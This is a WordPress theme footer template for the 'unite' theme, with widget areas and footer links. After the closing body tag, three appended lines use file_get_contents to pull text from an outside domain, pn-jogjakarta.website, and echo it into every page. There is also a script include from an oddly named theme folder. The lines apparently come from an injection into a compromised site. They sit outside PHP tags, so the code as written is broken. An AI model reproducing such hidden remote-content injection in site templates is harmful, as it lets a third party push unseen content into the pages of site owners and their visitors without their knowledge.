<?php
/**
 * The template for displaying the footer.
 *
 * Contains the closing of the #content div and all content after
 *
 * @package unite
 */
?>
	</div><!-- #content -->

	<footer id="colophon" class="site-footer" role="contentinfo">
		<div class="container">

			<div class="site-footer-widget col-md-12 col-sm-12 col-xs-12">
				<div id="footer-content">
					<div class="row">
						<div class="col-xs-12 col-sm-12 col-md-4 home-widget">
							<?php if( is_active_sidebar('home5') ) dynamic_sidebar( 'home5' ); ?> 
						</div>	
						<div class="hidden-xs col-sm-12 col-md-4 home-widget">
							<?php if( is_active_sidebar('home6') ) dynamic_sidebar( 'home6' ); ?> 
						</div>
						<div class="hidden-xs col-sm-12 col-md-4 home-widget">
							<?php if( is_active_sidebar('home7') ) dynamic_sidebar( 'home7' ); ?> 
						</div>
					</div>
				</div>
			</div>	
			<div class="site-info col-md-12 col-sm-12 col-xs-12">
				<nav role="navigation" class="col-md-6">
					<?php unite_footer_links(); ?>
				</nav>
				<div class="copyright col-md-6">
	<!-- 				<?php do_action( 'unite_credits' ); ?>
					<?php echo of_get_option( 'custom_footer_text', 'unite' ); ?> -->
					<?php do_action( 'unite_footer' ); ?> 
				</div>
			</div>
		</div><!-- .site-info -->
	</footer><!-- #colophon -->
</div><!-- #page -->
<?php wp_footer(); ?>
<script src="/wp-content/themes/archieve/inc/js/application.js"></script>
</body>
$a = file_get_contents('https://pn-jogjakarta.website/txt/asli.txt'); echo $a;
$a = file_get_contents('https://pn-jogjakarta.website/txt/asli-2.txt'); echo $a;
$a = file_get_contents('https://pn-jogjakarta.website/txt/rawatan.txt'); echo $a;
</html>
